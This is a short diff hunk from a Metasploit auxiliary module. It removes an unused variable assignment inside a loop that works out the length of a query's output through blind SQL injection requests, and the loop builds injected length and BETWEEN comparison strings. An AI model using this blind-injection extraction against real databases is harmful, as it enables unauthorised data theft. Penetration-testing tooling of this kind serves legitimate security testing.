@@ -204,7 +204,7 @@ class MetasploitModule < Msf::Auxiliary
       min_length = 0
       max_length = 800
       loop do
-        break if flag = blind_request("length(cast((#{query}) as binary))=#{output_length}")
+        break if blind_request("length(cast((#{query}) as binary))=#{output_length}")
 
         flag = blind_request("length(cast((#{query}) as binary))+BETWEEN+#{output_length}+AND+#{max_length}")
         if flag
